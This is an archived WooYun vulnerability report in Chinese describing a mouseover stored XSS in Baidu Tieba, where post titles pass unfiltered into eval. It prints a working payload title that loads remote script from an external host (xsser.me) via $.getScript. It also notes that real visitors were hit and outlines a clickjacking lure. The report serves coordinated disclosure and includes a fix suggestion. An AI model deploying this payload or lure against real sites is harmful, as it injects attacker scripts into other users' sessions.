@@ -1,0 +1,232 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度贴吧贴内一处Mouseover XSS利用  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度贴吧贴内一处Mouseover XSS利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2013-02-04 16:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-02-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-02-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-24：	细节向普通白帽子公开<br/>
+									2013-03-06：	细节向实习白帽子公开<br/>
+									2013-03-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">贴内一处操作，对数据未过滤，导致产生一处XSS，需要鼠标从上面经过才能触发，可结合clickjacking之类的使用。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 由于在编写工具，测试hook eval的效果。在贴吧内发了一帖子。http://tieba.baidu.com/p/2045714993<br />
+<br />
+<br />
+<br />
+标题为：&quot;。。生蛋啦～ &#039;<br />
+<br />
+<br />
+<br />
+2. 打开工具，对 “生蛋啦” 这三个字进行监视。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04163123e8d1aa201362562333ab09eb202a368b.jpg" target="_blank"><img src="../images/04163123e8d1aa201362562333ab09eb202a368b.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 刷新页面，并没有发现什么结果，但是当鼠标不小心移动到【分享到】按钮时，报告了一个，如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04163133ba3af78cd252468c2065d4206ffec882.jpg" target="_blank"><img src="../images/04163133ba3af78cd252468c2065d4206ffec882.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 从上图，我们不难看出，【标题】被作为 data 属性存储，并且通过getAttribute的方式读取，未过滤就传入eval中执行。<br />
+<br />
+<br />
+<br />
+5. 这样一来，我们就很容易构造代码了。<br />
+<br />
+<br />
+<br />
+发表一帖子，标题如下：<br />
+<br />
+<br />
+<br />
+&#039;,a:$.getScript(&#039;//xsser.me/Bqp9Ry&#039;),a:&#039;<br />
+<br />
+<br />
+<br />
+即最后被传入eval的数据变为:<br />
+<br />
+<br />
+<br />
+被eval的数据<br />
+<br />
+({title:&#039;分享到&#039;,wbuid:1673450172, text:&#039;&#039;,a:$.getScript(&#039;//xsser.me/Bqp9Ry&#039;),a:&#039;&#039;})<br />
+<br />
+<br />
+<br />
+帖子地址：http://tieba.baidu.com/p/2134900096<br />
+<br />
+<br />
+<br />
+6. 我自己的个人贴吧，没什么人访问。且要mouseover上去是有概率的，不过还是有中招的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04163143f711f423073348060ccdcddfe511e386.jpg" target="_blank"><img src="../images/04163143f711f423073348060ccdcddfe511e386.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 如果要增大这个的命中率， 可以做一个抽奖页面，搞个大按钮，然后把贴吧的页面 iframe 下，做个clickjacking。 当别人鼠标移到【抽奖】按钮上时，即可触发。具体代码不表。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如上。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">缺陷代码部分：<br />
+<br />
+</p><pre><code>function (e){pos=base.getposition(a);custom=(b.getattribute(&quot;data&quot;)&amp;&amp;b.getattribute(&quot;data&quot;)!=&quot;&quot;)?eval(&quot;(&quot;+b.getattribute(&quot;data&quot;)+&quot;)&quot;):&quot;&quot;;base.setattr(p,&quot;display:&quot;+v);base.setattr(p,&quot;left:&quot;+(((base.getsize().w-e.clientx)&lt;p.offsetwidth)?(pos.l-p.offsetwidth+a.offsetwidth):pos.l)+&quot;px&quot;);base.setattr(p,&quot;top:&quot;+(((base.getsize().h-e.clienty)&lt;p.offsetheight)?(pos.t-p.offsetheight):pos.t+a.offsetheight)+&quot;px&quot;);base.setattr(m,&quot;display:&quot;+v+&quot;;width:&quot;+p.offsetwidth+&quot;px;height:&quot;+p.offsetheight+&quot;px;left:&quot;+p.style.left+&quot;;top:&quot;+p.style.top)}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在eval之前，将b.getattribute(&quot;data&quot;)的值判断过滤下？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-018358" title="百度贴吧贴内一处Mouseover XSS利用">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2013-02-04 17:35</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对百度安全的关注，我们马上安排处理！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="18358";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
